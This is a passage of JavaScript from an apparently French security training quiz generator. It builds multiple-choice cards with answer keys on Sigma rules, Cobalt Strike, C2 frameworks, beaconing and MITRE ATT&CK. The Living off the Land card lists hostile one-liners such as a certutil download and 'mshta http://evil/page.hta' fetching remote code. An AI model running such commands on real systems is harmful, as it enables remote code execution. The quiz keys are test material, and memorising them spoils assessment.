        scenario: `Quels sont les <strong>niveaux de sévérité</strong> (<code>level:</code>) prévus par Sigma ?`,
        choices,
        hintFn: () => `5 niveaux : informational, low, medium, high, critical. Choisir en fonction de la confiance (faux positifs ?) ET de l'impact si vrai positif. Critical = malveillant clair (Mimikatz, lsass dump, ransomware enum).`
      });
    }

    if (qType === 4) {
      // Source de logs
      const sources = [
        { product: 'windows', service: 'security', usage: 'Windows Security.evtx (4624, 4625, 4688, etc.)' },
        { product: 'windows', service: 'sysmon', usage: 'Sysmon Events (1, 3, 7, 11, 13...)' },
        { product: 'windows', service: 'powershell', usage: 'PowerShell Script Block (4104)' },
        { product: 'linux', service: 'auditd', usage: 'auditd logs Linux (syscalls audit)' },
        { product: 'macos', service: 'unified', usage: 'macOS Unified Log' },
        { product: 'aws', service: 'cloudtrail', usage: 'AWS CloudTrail API calls' },
      ];
      const target = sources[rand(0, sources.length - 1)];
      const others = sources.filter(s => s !== target);
      const distractors = [];
      while (distractors.length < 3) {
        distractors.push(others.splice(rand(0, others.length - 1), 1)[0]);
      }
      const choices = [
        { text: target.usage, correct: true,
          explain: `<code>logsource:<br>  product: ${target.product}<br>  service: ${target.service}</code> cible <strong>${target.usage}</strong>.` },
        ...distractors.map(d => ({
          text: d.usage, correct: false,
          explain: `Ça correspond à <code>logsource: product: ${d.product}, service: ${d.service}</code>, pas ${target.service}.`
        }))
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Une règle Sigma a <code>logsource:<br>  product: ${target.product}<br>  service: ${target.service}</code>. Quels logs cible-t-elle ?`,
        choices,
        hintFn: () => `Logsources Sigma courants : windows/security (4624 etc.), windows/sysmon (1/3/7), windows/powershell (4104), linux/auditd, macos/unified, aws/cloudtrail, gcp/audit, azure/signinlogs. Le champ logsource conditionne la compilation vers le SIEM.`
      });
    }

    if (qType === 5) {
      // sigma-cli compile
      const choices = [
        { text: '<code>sigma-cli</code> (anciennement <code>sigmac</code>) — convertit YAML vers SPL/EQL/KQL/etc.', correct: true,
          explain: `Le compilateur officiel <strong>sigma-cli</strong> (Python, pip install sigma-cli) remplace l'ancien <code>sigmac</code>. Usage : <code>sigma convert -t splunk rule.yml</code> → produit la requête SPL équivalente. Cibles supportées : splunk, esql, eql, kql (Sentinel), grep, AWS CloudWatch, etc. Pour exécuter en live sur des EVTX : <strong>chainsaw</strong> (WithSecure, en Rust) applique des règles Sigma directement sur des fichiers EVTX.` },
        { text: 'gcc', correct: false,
          explain: `gcc compile du C, pas du Sigma.` },
        { text: 'Logstash', correct: false,
          explain: `Logstash transforme des logs en pipeline ELK, ne convertit pas Sigma.` },
        { text: 'PowerShell ISE', correct: false,
          explain: `Éditeur de scripts PowerShell, sans rapport.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Quel outil <strong>compile</strong> une règle Sigma YAML vers le langage natif d'un SIEM ?`,
        choices,
        hintFn: () => `sigma-cli (officiel, Python). Commande : <code>sigma convert -t splunk rule.yml</code>. Cibles : splunk, esql/eql (Elastic), kql (Sentinel), grep, AWS, GCP. Alternative pour live EVTX : chainsaw (WithSecure, Rust).`
      });
    }

    // qType === 6 : MITRE ATT&CK dans Sigma
    const choices = [
      { text: 'Champ <code>tags:</code> avec convention <code>attack.txxxx</code> (technique) et <code>attack.&lt;tactic&gt;</code>', correct: true,
        explain: `Sigma encourage le tagging avec MITRE ATT&CK. Format : <code>tags:<br>  - attack.t1059.001  # PowerShell<br>  - attack.execution<br>  - attack.persistence</code>. Permet de croiser la couverture détection avec la matrice ATT&CK (heatmap dans ATT&CK Navigator). Standard adopté par tout l'écosystème (SigmaHQ, Elastic Detection Rules, Sentinel Analytics Rules).` },
      { text: 'Champ <code>mitre:</code> avec liste de techniques', correct: false,
        explain: `Pas la convention. C'est <code>tags:</code> avec préfixe <code>attack.</code> (txxxx pour techniques, mot pour tactique).` },
      { text: 'Pas de support natif, à mettre en commentaire', correct: false,
        explain: `Faux : Sigma supporte explicitement les tags ATT&CK depuis ses débuts.` },
      { text: 'Champ <code>ttp:</code>', correct: false,
        explain: `Pas le nom du champ standard. C'est <code>tags:</code> avec <code>attack.</code>.` },
    ].sort(() => Math.random() - 0.5);
    return buildQCMCard({
      ...opts,
      scenario: `Comment référencer une <strong>technique MITRE ATT&amp;CK</strong> dans une règle Sigma ?`,
      choices,
      hintFn: () => `Champ <code>tags:</code> avec <code>attack.txxxx</code> (technique, ex: attack.t1059.001 = PowerShell) + <code>attack.&lt;tactic&gt;</code> (ex: attack.execution). Permet de mesurer la couverture détection vs ATT&CK Navigator.`
    });
  }

  // ════════════════════════════════════════════════════════════════
  // TP 4 : C2 Frameworks & Post-Exploitation
  // ════════════════════════════════════════════════════════════════

  function genC2() {
    const qType = rand(0, 6);
    const opts = { prefix: 'c2', icon: '🎯', title: 'C2 Frameworks & Post-Exploitation', badge: 'attack' };

    if (qType === 0) {
      // Cobalt Strike concept
      const choices = [
        { text: 'Un <strong>framework C2 commercial</strong> (Fortra) — référence des red teams, abusé par les groupes ransomware', correct: true,
          explain: `<strong>Cobalt Strike</strong> (créé par Raphael Mudge en 2012, racheté par Fortra ex-HelpSystems). Composants :<br>• <strong>Team Server</strong> (serveur C2 Java)<br>• <strong>Aggressor</strong> (client GUI)<br>• <strong>Beacon</strong> (implant, le payload qui tourne sur la cible)<br>Cracké et largement piraté → abusé par Conti, Black Basta, LockBit. Détection : pipes nommés <code>\\\\.\\pipe\\msagent_*</code>, comportement de beaconing, profile Malleable C2 (souvent par défaut → patterns détectables).` },
        { text: 'Un antivirus de Microsoft', correct: false,
          explain: `Microsoft Defender. Cobalt Strike est l'inverse — un outil offensif.` },
        { text: 'Un protocole réseau IETF', correct: false,
          explain: `C'est un framework logiciel commercial, pas un standard IETF.` },
        { text: 'Une CA root russe', correct: false,
          explain: `Pas du tout. Outil offensif commercial (États-Unis).` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Qu'est-ce que <strong>Cobalt Strike</strong> ?`,
        choices,
        hintFn: () => `Framework C2 commercial (Fortra). Beacon = implant. Team Server = C2. Aggressor = client. Cracké/piraté → utilisé par tous les grands groupes ransomware. Détection forensique = patterns de beaconing, named pipes.`
      });
    }

    if (qType === 1) {
      // Beaconing
      const sleep = [60, 90, 120, 300][rand(0, 3)];
      const jitter = [10, 20, 30, 50][rand(0, 3)];
      const jitterPct = jitter / 100;
      const minDelay = Math.floor(sleep * (1 - jitterPct));
      const maxDelay = Math.floor(sleep * (1 + jitterPct));
      const correct = `Entre ${minDelay} et ${maxDelay} secondes`;
      const distractors = [
        `Exactement toutes les ${sleep} secondes`,
        `Entre 0 et ${sleep * 2} secondes`,
        `Toutes les ${jitter} secondes`,
      ];
      const choices = [
        { text: correct, correct: true,
          explain: `Sleep ${sleep}s + jitter ${jitter}% → intervalle entre <strong>${minDelay}s</strong> (${sleep} − ${jitter}%) et <strong>${maxDelay}s</strong> (${sleep} + ${jitter}%). Le jitter rend la périodicité moins détectable. Détection beaconing : analyse statistique des intervalles (RITA, Zeek), entropie des destinations.` },
        ...distractors.map(d => ({ text: d, correct: false,
          explain: `Faux. Le jitter ajoute une variation autour de sleep, pas la valeur sleep elle-même ni de 0 à 2×sleep.` }))
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Un beacon Cobalt Strike est configuré avec <code>sleep = ${sleep}s</code> et <code>jitter = ${jitter}%</code>. À quel intervalle check-in-t-il vers le C2 ?`,
        choices,
        hintFn: () => `Jitter J% appliqué sur sleep S : intervalle uniforme entre S(1-J/100) et S(1+J/100). Exemple : sleep 60 + jitter 30% → 42-78s. Détection : analyse statistique (RITA, Zeek), entropie domains, durée connexions.`
      });
    }

    if (qType === 2) {
      // Pipe nommé Cobalt Strike
      const choices = [
        { text: '<code>\\\\.\\pipe\\msagent_*</code> — pipe par défaut de Cobalt Strike, souvent détecté par Sigma/EDR', correct: true,
          explain: `Cobalt Strike utilise par défaut le nom de pipe <code>\\\\.\\pipe\\msagent_XXXX</code> (4 chars random). Pattern bien connu, détecté par les EDR. Les opérateurs avancés changent ce nom dans le Malleable C2 profile (option <code>set_pipename</code>). Reste un indicateur précieux : Sysmon Event 17 (PipeCreated) sur <code>msagent_*</code> = suspicion immédiate de Cobalt Strike.` },
        { text: '<code>\\\\.\\pipe\\spoolsv</code> — pipe légitime du Print Spooler', correct: false,
          explain: `spoolsv est légitime (Windows Print Spooler). Cobalt Strike pourrait l'imiter mais ce n'est pas son défaut.` },
        { text: '<code>\\\\.\\pipe\\samr</code> — accès SAM Windows', correct: false,
          explain: `Pipe SAM = légitime. Pas Cobalt Strike.` },
        { text: '<code>\\\\.\\pipe\\rpc_control</code>', correct: false,
          explain: `Pipe RPC légitime Windows, pas Cobalt Strike.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Quel pattern de <strong>named pipe</strong> est un indicateur classique de Cobalt Strike ?`,
        choices,
        hintFn: () => `\\\\.\\pipe\\msagent_XXXX (4 chars random) = défaut Cobalt Strike. Sysmon Event 17 (PipeCreated) sur ce pattern = forte suspicion. Les opérateurs avertis customisent via Malleable C2 (set_pipename).`
      });
    }

    if (qType === 3) {
      // Frameworks alternatifs
      const choices = [
        { text: '<strong>Sliver</strong> (BishopFox, 2020), <strong>Mythic</strong> (SpecterOps), <strong>Havoc</strong> — open source en Go/Python', correct: true,
          explain: `Alternatives modernes à Cobalt Strike :<br>• <strong>Sliver</strong> (BishopFox, en Go) — multi-plateforme, mTLS, gRPC<br>• <strong>Mythic</strong> (SpecterOps, Python/Docker) — architecture modulaire avec "agents" écrits dans des langages variés<br>• <strong>Havoc</strong> (C5pider) — interface élégante, payloads en C<br>• <strong>Brute Ratel</strong> (commercial, alternative payante)<br>Les groupes de menace migrent progressivement vers Sliver/Brute Ratel pour échapper aux détections Cobalt Strike.` },
        { text: 'Pas d\'alternative open source — uniquement Cobalt Strike commercial', correct: false,
          explain: `Faux. Plusieurs alternatives open source existent et sont matures (Sliver, Mythic, Havoc).` },
        { text: 'Uniquement Metasploit', correct: false,
          explain: `Metasploit existe (Rapid7) mais c'est plutôt un framework d'exploitation initiale, pas un C2 post-exploitation pur (bien qu'il ait <code>meterpreter</code>).` },
        { text: 'PowerShell Empire abandonné depuis 2019', correct: false,
          explain: `Empire a été abandonné en 2019 puis repris par BC-SECURITY. Toujours utilisé, mais en perte de vitesse vs Sliver/Mythic.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Quels sont les <strong>frameworks C2 open source alternatifs</strong> à Cobalt Strike en 2026 ?`,
        choices,
        hintFn: () => `Sliver (BishopFox, Go, mTLS), Mythic (SpecterOps, Python/Docker), Havoc (interface moderne). Commercial alt : Brute Ratel. Empire = repris par BC-SECURITY mais en perte de vitesse. Migration en cours chez les threat actors.`
      });
    }

    if (qType === 4) {
      // Malleable C2
      const choices = [
        { text: 'Un fichier de configuration qui <strong>personnalise l\'apparence du trafic</strong> Cobalt Strike (HTTP headers, URIs, jitter)', correct: true,
          explain: `<strong>Malleable C2 profile</strong> = fichier de config Cobalt Strike qui dicte à quoi ressemble le trafic réseau du beacon. Permet d'imiter du trafic légitime : profile "Amazon", "Microsoft Updates", "jQuery", etc. Influence : <code>set sleeptime</code>, <code>set jitter</code>, <code>http-get { uri "..." }</code>, <code>http-post</code>, <code>set_user-agent</code>, <code>spawnto</code>, <code>process-inject</code>. Détection : reconnaître les profiles publics (par fingerprint des URIs, headers). Projets publics : <code>Malleable-C2-Profiles</code> sur GitHub (rsmudge).` },
        { text: 'Un nouveau langage de programmation', correct: false,
          explain: `Pas un langage : c'est un format de configuration spécifique à Cobalt Strike.` },
        { text: 'Le nom du virus informatique en 2024', correct: false,
          explain: `Inventé. Malleable C2 est une fonctionnalité Cobalt Strike, pas un malware.` },
        { text: 'Une CA root utilisée par Cobalt Strike', correct: false,
          explain: `Sans rapport. Aucune CA root spécifique.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Qu'est-ce qu'un <strong>Malleable C2 profile</strong> ?`,
        choices,
        hintFn: () => `Fichier de config Cobalt Strike : personnalise trafic HTTP (URIs, headers, user-agent), jitter, spawnto, injection. Imite du trafic légitime. Profiles publics : github.com/rsmudge/Malleable-C2-Profiles. Détection : fingerprinting des profiles connus.`
      });
    }

    if (qType === 5) {
      // Living off the Land
      const choices = [
        { text: 'Utiliser les <strong>binaires natifs Windows</strong> (LOLBAS) pour échapper aux EDR : powershell, certutil, mshta, rundll32, wmic', correct: true,
          explain: `<strong>Living off the Land</strong> (LOTL) : éviter de déposer du nouveau code en utilisant des outils déjà présents et signés Microsoft. Projet de référence : <strong>LOLBAS</strong> (Living Off The Land Binaries, Scripts, and Libraries) — github.com/LOLBAS-Project/LOLBAS. Exemples classiques :<br>• <code>certutil -urlcache -split -f http://...</code> (download fichier)<br>• <code>powershell -enc &lt;base64&gt;</code> (exec encodé)<br>• <code>mshta http://evil/page.hta</code> (exec HTA distant)<br>• <code>rundll32 url.dll,OpenURL ...</code><br>• <code>wmic process call create ...</code>` },
        { text: 'Vivre dans une cabane à la campagne', correct: false,
          explain: `L'expression vient du folklore américain (survivalisme) mais en cyber elle désigne une technique offensive.` },
        { text: 'Installer un antivirus open source', correct: false,
          explain: `LOTL est une technique offensive, pas défensive.` },
        { text: 'Utiliser uniquement des outils sur clé USB', correct: false,
          explain: `Inverse : LOTL = n'apporter aucun outil, utiliser ceux déjà présents sur le système.` },
      ].sort(() => Math.random() - 0.5);
      return buildQCMCard({
        ...opts,
        scenario: `Que désigne <strong>Living off the Land</strong> (LOTL) en cyber offensif ?`,
        choices,
        hintFn: () => `LOTL = abuser des binaires Windows signés Microsoft (LOLBAS project). powershell, certutil, mshta, rundll32, wmic, regsvr32, bitsadmin. Échappe à la détection signature. Détection moderne : analyse comportementale (EDR) + Sigma sur arguments suspects.`
      });
    }

    // qType === 6 : MITRE ATT&CK tactics
    const tactics = [
      { id: 'TA0001', name: 'Initial Access', example: 'phishing, exploit public-facing app' },
      { id: 'TA0002', name: 'Execution', example: 'PowerShell, cmd, WMI' },
      { id: 'TA0003', name: 'Persistence', example: 'Registry Run keys, scheduled tasks, services' },
      { id: 'TA0004', name: 'Privilege Escalation', example: 'UAC bypass, token impersonation, exploit kernel' },
      { id: 'TA0005', name: 'Defense Evasion', example: 'masquerading, obfuscation, disable AV' },
      { id: 'TA0006', name: 'Credential Access', example: 'Mimikatz, LSASS dump, keylogger' },
      { id: 'TA0008', name: 'Lateral Movement', example: 'PsExec, RDP, SMB share, pass-the-hash' },
      { id: 'TA0010', name: 'Exfiltration', example: 'over C2 channel, DNS tunneling, cloud upload' },
      { id: 'TA0011', name: 'Command and Control', example: 'beaconing, application layer protocol' },
    ];
    const target = tactics[rand(0, tactics.length - 1)];
    const others = tactics.filter(t => t !== target);
    const distractors = [];
    while (distractors.length < 3) {
      distractors.push(others.splice(rand(0, others.length - 1), 1)[0]);
    }
    const choices = [
      { text: target.name, correct: true,
        explain: `<strong>${target.id} = ${target.name}</strong>. Exemples de techniques : ${target.example}. Consulter <code>attack.mitre.org/tactics/${target.id}/</code> pour la liste complète des techniques affiliées.` },
      ...distractors.map(d => ({
        text: d.name, correct: false,
        explain: `${d.name} = <strong>${d.id}</strong>, pas ${target.id}. (Exemples : ${d.example}.)`
      }))
    ].sort(() => Math.random() - 0.5);
    return buildQCMCard({
      ...opts,
      scenario: `Dans la matrice MITRE ATT&amp;CK Enterprise, à quoi correspond la tactique <strong>${target.id}</strong> ?`,
      choices,
      hintFn: () => `14 tactiques ATT&CK Enterprise (TA0001-TA0043 avec trous). Mémo : Initial → Execution → Persistence → PrivEsc → Defense Evasion → Credential → Discovery → Lateral → Collection → C2 → Exfil → Impact. Référence : attack.mitre.org.`
    });
  }

  // ════════════════════════════════════════════════════════════════
  // Enregistrement dans GENERATORS
  // ════════════════════════════════════════════════════════════════
  if (typeof window !== 'undefined' && window.GENERATORS) {
    window.GENERATORS.exif = genEXIF;
    window.GENERATORS.osintdns = genOSINTDNS;
    window.GENERATORS.sigma = genSigma;
    window.GENERATORS.c2 = genC2;
  } else if (typeof GENERATORS !== 'undefined') {
    GENERATORS.exif = genEXIF;
    GENERATORS.osintdns = genOSINTDNS;
    GENERATORS.sigma = genSigma;
    GENERATORS.c2 = genC2;
  }

  if (typeof window !== 'undefined') {
    window.genEXIF = genEXIF;
    window.genOSINTDNS = genOSINTDNS;
    window.genSigma = genSigma;
    window.genC2 = genC2;
  }
})();
